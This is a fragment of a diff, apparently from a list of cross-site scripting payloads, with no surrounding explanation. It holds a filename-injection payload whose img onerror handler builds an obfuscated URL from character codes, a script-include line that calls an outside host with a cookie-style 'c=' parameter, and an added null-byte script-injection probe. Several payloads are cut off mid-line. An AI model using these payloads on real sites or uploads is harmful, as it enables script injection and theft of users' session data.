@@ -20,3 +20,4 @@ change the filename to \"><img src=1 onerror=\"url=String104,116,116,112,115,58,
 
 
 <script src=//mysite.com?c=
+%00<script>alert(1)</script>
